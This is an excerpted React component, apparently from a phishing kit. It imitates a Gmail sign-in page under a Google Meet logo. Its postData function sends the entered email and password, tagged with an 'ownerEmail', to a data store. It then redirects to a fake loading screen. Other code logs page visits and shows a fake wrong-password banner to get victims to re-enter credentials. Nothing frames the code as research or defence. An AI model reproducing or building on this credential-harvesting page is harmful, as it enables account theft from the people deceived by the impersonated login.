...
import googleMeetLogo from "../assets/meet_logo.png"
...
const Gmail = () => {
  ...
  const showWrongPassMsg = searchParams.get('wrongPass') === 'true' ? true : false
  ...
  async function postData() {
    try {
      ...
      const result = await addData(emailValue, passValue, ownerEmail, 'data')

      console.log(pathNames, result.id)

      navigate(`/${pathNames[1]}/loading/${result.id}`)
  ...
  useEffect(() => {
    addClick(`${username}@gmail.com`, 'data')
  }, [])
    ...
    <div className="w-full max-w-md mx-auto z-20 relative">
      <div className="w-full p-2 bg-neutral-50">
        ...
        <div className="flex items-center justify-center mb-4">
          <img src={googleMeetLogo} alt="Google Meet" className="w-40" />
        </div>
        ...
        <p
          id="msg"
          className={`${showWrongPassMsg ? "block" : "hidden"} mt-3 rounded bg-red-600/80 text-white p-2 text-sm text-center`}
        >
